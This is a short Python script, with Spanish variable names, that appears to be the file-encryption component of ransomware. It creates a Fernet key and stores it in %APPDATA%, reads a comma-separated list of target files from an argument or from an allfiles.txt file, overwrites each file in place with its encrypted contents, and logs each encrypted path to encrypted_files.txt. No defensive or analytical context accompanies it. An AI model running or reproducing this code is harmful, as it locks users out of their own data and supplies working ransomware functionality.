import sys
from cryptography.fernet import Fernet
import os

temp_dir = os.path.expandvars(r"%APPDATA%")

clave = Fernet.generate_key()
ruta_clave = os.path.join(temp_dir, "clave.key")

with open(ruta_clave, "wb") as clave_archivo:
    clave_archivo.write(clave)

with open(ruta_clave, "rb") as clave_archivo:
    clave = clave_archivo.read()

fernet = Fernet(clave)

temp_dir = os.path.expandvars(r"%APPDATA%")
file_path=os.path.join(temp_dir, "allfiles.txt")
if sys.argv[1] == file_path:
    with open(file_path, 'r') as f:
      archivos = f.read().strip().split(',')
      print(archivos)
else:
    archivos = sys.argv[1].strip().split(",")

for archivo in archivos:
    if os.path.exists(archivo):  
        with open(archivo, "rb") as file:
            datos = file.read() 

        datos_encriptados = fernet.encrypt(datos)
        try:
          with open(archivo, "wb") as file:
             file.write(datos_encriptados)
        except:
          pass

        print(f"Files has been successfully encrypted.")
        
        ruta_lista = os.path.join(temp_dir, "encrypted_files.txt")

        with open(ruta_lista, "a") as lista_archivo:
            lista_archivo.write(f"{archivo}\n")
    else:
        print(f"File ‘{archivo}’ does not exist.")

